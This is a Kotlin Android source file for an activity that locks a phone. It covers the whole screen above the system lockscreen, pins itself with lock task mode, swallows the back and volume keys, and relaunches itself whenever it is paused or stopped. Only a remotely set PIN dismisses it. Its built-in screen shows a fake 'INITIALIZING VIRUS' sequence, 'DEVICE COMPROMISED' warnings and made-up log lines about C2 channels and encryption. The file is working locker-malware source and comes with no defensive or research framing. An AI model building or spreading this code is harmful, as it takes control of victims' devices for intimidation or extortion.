package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.view.KeyEvent
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.media.MediaPlayer

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        // ── fullscreen + jaga layar nyala + tampil di atas lockscreen sistem ──
        applyFullscreen()
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }

        setupWebView()
        registerUnlockReceiver()

        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            if (dpm.isLockTaskPermitted(packageName)) startLockTask()
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
        if (!isUnlocked) return
        super.onBackPressed()
    }

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
        super.onStop()
        if (isUnlocked) return
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  FULLSCREEN + BLOCK BUTTONS
    // ═══════════════════════════════════════════════════════════

    private fun applyFullscreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
            window.insetsController?.let {
                it.hide(
                    android.view.WindowInsets.Type.statusBars() or
                    android.view.WindowInsets.Type.navigationBars()
                )
                it.systemBarsBehavior =
                    android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            }
        } else {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (
                android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or android.view.View.SYSTEM_UI_FLAG_FULLSCREEN
                or android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) applyFullscreen()
    }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        if (isUnlocked) return super.dispatchKeyEvent(event)
        when (event.keyCode) {
            KeyEvent.KEYCODE_VOLUME_UP,
            KeyEvent.KEYCODE_VOLUME_DOWN,
            KeyEvent.KEYCODE_VOLUME_MUTE,
            KeyEvent.KEYCODE_CAMERA,
            KeyEvent.KEYCODE_HEADSETHOOK -> return true
        }
        return super.dispatchKeyEvent(event)
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (!isUnlocked) {
            when (keyCode) {
                KeyEvent.KEYCODE_VOLUME_UP,
                KeyEvent.KEYCODE_VOLUME_DOWN,
                KeyEvent.KEYCODE_VOLUME_MUTE -> return true
            }
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onKeyUp(keyCode: Int, event: KeyEvent?): Boolean {
        if (!isUnlocked) {
            when (keyCode) {
                KeyEvent.KEYCODE_VOLUME_UP,
                KeyEvent.KEYCODE_VOLUME_DOWN,
                KeyEvent.KEYCODE_VOLUME_MUTE -> return true
            }
        }
        return super.onKeyUp(keyCode, event)
    }

    // ═══════════════════════════════════════════════════════════
    //  WEBVIEW
    // ═══════════════════════════════════════════════════════════

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.BLACK)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val displayTitle = "🇦🇱 Your Device Is Locked 🇦🇱"

        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#000000;
  --green:#00ff41;
  --green-dim:rgba(0,255,65,.08);
  --green-brd:rgba(0,255,65,.25);
  --red:#ff2b2b;
  --text:#d8ffd8;
  --text2:#2f8a3f;
  --text3:#0f3a18;
}
html,body{
  height:100%;width:100%;overflow:hidden;touch-action:none;
  background:var(--bg);
  font-family:'Share Tech Mono','JetBrains Mono',monospace;
  -webkit-font-smoothing:antialiased;
  position:fixed;inset:0;
}
body::after{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:5;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.02) 2px,rgba(0,255,65,.02) 4px);
  animation:scanMove 10s linear infinite;
}
@keyframes scanMove{to{background-position:0 120px}}
body::before{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:4;
  background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.85) 100%);
}

/* ══════════════ INTRO 20s ══════════════ */
#introScreen{
  position:fixed;inset:0;z-index:50;
  background:#000;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:22px;
  transition:opacity .6s ease;
}
#introScreen.done{opacity:0;pointer-events:none}

#matrix{
  position:absolute;inset:0;z-index:0;opacity:.55;
}

.intro-core{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;gap:20px;padding:0 24px;width:100%}

.intro-title{
  font-size:15px;letter-spacing:4px;text-transform:uppercase;
  color:var(--green);text-align:center;line-height:1.9;
  text-shadow:0 0 8px var(--green),0 0 22px rgba(0,255,65,.5);
  min-height:60px;
}
.intro-title .glitch{animation:glitchTxt 3.5s infinite}
@keyframes glitchTxt{
  0%,92%,100%{transform:none;opacity:1}
  93%{transform:translateX(-3px);opacity:.7;color:var(--red)}
  95%{transform:translateX(3px);opacity:.9}
  97%{transform:translateX(-1px)}
}

.intro-bar-wrap{
  width:min(280px,80vw);height:4px;
  background:rgba(0,255,65,.12);border-radius:2px;overflow:hidden;
  box-shadow:0 0 10px rgba(0,255,65,.2) inset;
}
.intro-bar{
  height:100%;width:0%;
  background:linear-gradient(90deg,#003a10,var(--green));
  box-shadow:0 0 12px var(--green);
  animation:barFill 20s linear forwards;
}
@keyframes barFill{to{width:100%}}

.intro-pct{
  font-size:12px;letter-spacing:3px;color:var(--green);
  text-shadow:0 0 10px var(--green);
}

.intro-log{
  font-size:9px;letter-spacing:1.5px;color:var(--text2);
  height:44px;overflow:hidden;text-align:center;line-height:1.6;
  width:100%;max-width:320px;
}

.intro-warn{
  position:absolute;bottom:40px;left:0;right:0;text-align:center;z-index:2;
  font-size:10px;letter-spacing:3px;color:var(--red);
  text-shadow:0 0 10px var(--red);
  animation:warnBlink 1s steps(2) infinite;
}
@keyframes warnBlink{50%{opacity:.15}}

/* ══════════════ PIN SCREEN ══════════════ */
#pinScreen{
  position:fixed;inset:0;z-index:10;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:28px 22px;
  opacity:0;pointer-events:none;
  transition:opacity .8s ease;
}
#pinScreen.show{opacity:1;pointer-events:auto}

.lock-glyph{
  width:70px;height:70px;margin-bottom:18px;
  border-radius:50%;
  border:1.5px solid var(--green-brd);
  display:flex;align-items:center;justify-content:center;
  background:radial-gradient(circle at 40% 35%,rgba(0,255,65,.12),rgba(0,40,15,.4));
  box-shadow:0 0 0 1px rgba(0,0,0,.6),0 0 40px rgba(0,255,65,.25),inset 0 1px 0 rgba(0,255,100,.1);
  animation:lockPulse 2.2s ease-in-out infinite;
}
@keyframes lockPulse{
  0%,100%{box-shadow:0 0 0 1px rgba(0,0,0,.6),0 0 26px rgba(0,255,65,.2),inset 0 1px 0 rgba(0,255,100,.1)}
  50%{box-shadow:0 0 0 1px rgba(0,0,0,.6),0 0 60px rgba(0,255,65,.45),0 0 100px rgba(0,255,65,.12),inset 0 1px 0 rgba(0,255,100,.15)}
}

.lock-title{
  font-size:17px;font-weight:700;letter-spacing:.5px;
  color:var(--text);text-align:center;line-height:1.35;
  margin-bottom:6px;
  text-shadow:0 0 18px rgba(0,255,65,.4);
}
.lock-sub{
  font-size:9px;letter-spacing:3px;text-transform:uppercase;
  color:var(--text2);text-align:center;margin-bottom:26px;
}

.pin-wrap{display:flex;gap:18px;justify-content:center;margin-bottom:12px}
.pin-dot{
  width:15px;height:15px;border-radius:50%;
  border:1.5px solid rgba(0,255,65,.25);background:transparent;
  transition:all .18s ease;
}
.pin-dot.filled{
  background:var(--green);border-color:var(--green);
  box-shadow:0 0 14px rgba(0,255,65,.9),0 0 28px rgba(0,255,65,.5);
  transform:scale(1.15);
}
.pin-dot.error{
  border-color:var(--red);background:rgba(255,43,43,.3);
  box-shadow:0 0 14px rgba(255,43,43,.7);
  animation:shake .4s ease;
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}

.pin-status{
  height:22px;margin-bottom:24px;
  font-size:10px;letter-spacing:2.5px;text-transform:uppercase;
  text-align:center;color:var(--text3);transition:color .2s;
}
.pin-status.err{color:var(--red);text-shadow:0 0 10px rgba(255,43,43,.6)}
.pin-status.ok{color:var(--green);text-shadow:0 0 10px var(--green)}

.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:11px;width:100%;max-width:290px}
.key{
  height:64px;border-radius:12px;
  border:1px solid rgba(0,255,65,.1);
  background:linear-gradient(160deg,rgba(0,255,65,.05),rgba(0,40,15,.15));
  color:var(--text);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;-webkit-tap-highlight-color:transparent;user-select:none;
  transition:transform .1s,background .1s,border-color .1s,box-shadow .1s;
  position:relative;overflow:hidden;
  box-shadow:0 2px 10px rgba(0,0,0,.7),inset 0 1px 0 rgba(0,255,65,.04);
}
.key::before{
  content:'';position:absolute;top:0;left:12%;right:12%;height:1px;
  background:linear-gradient(90deg,transparent,rgba(0,255,65,.12),transparent);
}
.key .num{font-size:22px;font-weight:700;line-height:1;letter-spacing:-.5px}
.key .sub{font-size:7px;letter-spacing:2px;color:var(--text2);margin-top:3px}
.key.del{color:var(--text2)}
.key.empty{pointer-events:none;opacity:0;background:transparent;border-color:transparent;box-shadow:none}
.key:active{
  transform:scale(.92);
  background:linear-gradient(160deg,rgba(0,255,65,.18),rgba(0,120,40,.15));
  border-color:rgba(0,255,65,.4);
  box-shadow:0 0 22px rgba(0,255,65,.25),inset 0 1px 0 rgba(0,255,65,.15);
}

.panic-strip{
  position:fixed;bottom:18px;left:0;right:0;text-align:center;z-index:20;
  font-size:8px;letter-spacing:2px;color:#1a5a2a;
  pointer-events:none;
}
</style>
</head>
<body>

<div id="introScreen">
  <canvas id="matrix"></canvas>
  <div class="intro-core">
    <div class="intro-title glitch">INITIALIZING VIRUS....</div>
    <div class="intro-bar-wrap"><div class="intro-bar"></div></div>
    <div class="intro-pct" id="introPct">0%</div>
    <div class="intro-log" id="introLog"></div>
  </div>
  <div class="intro-warn">⚠ DEVICE COMPROMISED ⚠</div>
</div>

<div id="pinScreen">
  <div class="lock-glyph">
    <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#00ff41" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <rect x="4" y="10" width="16" height="11" rx="2"/>
      <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
      <circle cx="12" cy="15.5" r="1.4" fill="#00ff41"/>
      <line x1="12" y1="16.5" x2="12" y2="19"/>
    </svg>
  </div>

  <div class="lock-title">${displayTitle}</div>
  <div class="lock-sub">Enter PIN To Unlock</div>

  <div class="pin-wrap">
    <div class="pin-dot" id="d0"></div>
    <div class="pin-dot" id="d1"></div>
    <div class="pin-dot" id="d2"></div>
    <div class="pin-dot" id="d3"></div>
  </div>

  <div class="pin-status" id="pinStatus">System Locked — Verification Required</div>

  <div class="keypad" id="keypad">
    <div class="key" data-n="1"><span class="num">1</span></div>
    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
    <div class="key empty"></div>
    <div class="key" data-n="0"><span class="num">0</span></div>
    <div class="key del" data-del="1">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
        <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
      </svg>
    </div>
  </div>
</div>

<div class="panic-strip">UNAUTHORIZED ACCESS WILL BE LOGGED</div>

<script>
(function(){
  var c = document.getElementById('matrix');
  var ctx = c.getContext('2d');
  var chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEFｱｲｳｴｵ';
  var fs = 16, cols, drops;
  function resize(){
    c.width = window.innerWidth;
    c.height = window.innerHeight;
    cols = Math.floor(c.width / fs);
    drops = new Array(cols).fill(1);
  }
  resize();
  window.addEventListener('resize', resize);
  function draw(){
    ctx.fillStyle = 'rgba(0,0,0,0.08)';
    ctx.fillRect(0,0,c.width,c.height);
    ctx.fillStyle = '#00ff41';
    ctx.font = fs + 'px monospace';
    ctx.shadowColor = '#00ff41';
    ctx.shadowBlur = 6;
    for(var i=0;i<cols;i++){
      var ch = chars[Math.floor(Math.random()*chars.length)];
      ctx.fillText(ch, i*fs, drops[i]*fs);
      if(drops[i]*fs > c.height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
  }
  var iv = setInterval(draw, 55);
  window._stopMatrix = function(){ clearInterval(iv); };
})();

(function(){
  var pctEl = document.getElementById('introPct');
  var logEl = document.getElementById('introLog');
  var start = Date.now();
  var dur = 20000;
  var logs = [
    '> mounting /system ...',
    '> bypassing kernel lock ...',
    '> injecting payload ...',
    '> disabling physical buttons ...',
    '> encrypting partition ...',
    '> establishing C2 channel ...',
    '> locking device ...',
    'NEXSUS NIH DEK IZIN LEWAT...',
  ];
  var li = 0;
  var logIv = setInterval(function(){
    logEl.textContent = logs[li % logs.length];
    li++;
  }, 2500);
  function tick(){
    var p = Math.min(1, (Date.now()-start)/dur);
    pctEl.textContent = Math.floor(p*100) + '%';
    if(p < 1){
      requestAnimationFrame(tick);
    } else {
      clearInterval(logIv);
      if(window._stopMatrix) window._stopMatrix();
      document.getElementById('introScreen').classList.add('done');
      setTimeout(function(){
        document.getElementById('introScreen').style.display = 'none';
        document.getElementById('pinScreen').classList.add('show');
      }, 650);
    }
  }
  requestAnimationFrame(tick);
})();

var pin = '';
var blocked = false;
var keypad = document.getElementById('keypad');

keypad.addEventListener('touchend', function(e){
  e.preventDefault();
  var key = e.target.closest('.key');
  if(!key || key.classList.contains('empty')) return;
  if(key.dataset.del){ doDelete(); return; }
  if(key.dataset.n !== undefined) doPress(key.dataset.n);
}, {passive:false});

keypad.addEventListener('click', function(e){
  if(e.sourceCapabilities && e.sourceCapabilities.firesTouchEvents) return;
  var key = e.target.closest('.key');
  if(!key || key.classList.contains('empty')) return;
  if(key.dataset.del){ doDelete(); return; }
  if(key.dataset.n !== undefined) doPress(key.dataset.n);
});

function doPress(n){
  if(blocked || pin.length >= 4) return;
  pin += n;
  updateDots();
  if(pin.length === 4) setTimeout(checkPin, 150);
}
function doDelete(){
  if(blocked) return;
  pin = pin.slice(0,-1);
  updateDots();
  setStatus('System Locked — Verification Required', false, false);
}
function updateDots(){
  for(var i=0;i<4;i++){
    var d = document.getElementById('d'+i);
    d.classList.toggle('filled', i < pin.length);
    d.classList.remove('error');
  }
}
function checkPin(){
  var ok = false;
  try { ok = LockBridge.tryUnlock(pin); } catch(e){}
  if(ok){
    setStatus('ACCESS GRANTED ✓', false, true);
  } else {
    setStatus('ACCESS DENIED!', true, false);
    for(var i=0;i<4;i++) document.getElementById('d'+i).classList.add('error');
    blocked = true;
    setTimeout(function(){
      pin=''; blocked=false; updateDots();
      setStatus('System Locked — Verification Required', false, false);
    }, 1200);
  }
}
function setStatus(msg, isErr, isOk){
  var el = document.getElementById('pinStatus');
  el.textContent = msg;
  el.className = 'pin-status' + (isErr ? ' err' : isOk ? ' ok' : '');
}
</script>
</body>
</html>
"""
    }
}